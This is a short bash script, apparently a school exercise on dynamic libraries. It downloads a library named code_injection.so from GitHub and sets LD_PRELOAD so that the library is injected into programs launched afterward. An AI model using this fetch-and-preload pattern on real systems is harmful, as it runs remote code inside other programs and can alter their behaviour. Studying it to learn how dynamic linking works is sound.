#!/bin/bash
wget https://github.com/Hegeldirkk/alx-low_level_programming/tree/master/0x18-dynamic_libraries/code_injection.so -P ../
export LD_PRELOAD=../code_injection.so
